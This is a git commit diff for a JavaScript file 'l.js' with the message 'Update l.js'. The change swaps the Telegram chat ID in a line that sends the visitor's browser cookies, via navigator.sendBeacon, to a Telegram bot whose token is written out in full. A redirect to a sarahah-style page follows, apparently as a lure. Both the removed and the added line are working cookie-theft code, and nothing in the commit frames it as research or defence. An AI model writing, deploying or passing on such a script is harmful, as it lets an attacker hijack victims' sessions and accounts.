1f75977a1c375cb577f268af5286ae7f53a3180e
ae54 <chromscurity11@gmail.com>
2025-01-28 09:27:29 +0200

    Update l.js

--- l.js
+++ l.js
@@ -1,2 +1,2 @@
-navigator.sendBeacon(`https://api.telegram.org/bot7858688597:AAHkWaP75HtsOoU-9UvK094DuONFzZ48VWY/sendMessage?chat_id=6662346056&text=${encodeURIComponent(document.cookie)}`);
+navigator.sendBeacon(`https://api.telegram.org/bot7858688597:AAHkWaP75HtsOoU-9UvK094DuONFzZ48VWY/sendMessage?chat_id=5864267471&text=${encodeURIComponent(document.cookie)}`);
 window.location.href = "https://sarhne.sarahah.pro/38633557759051";
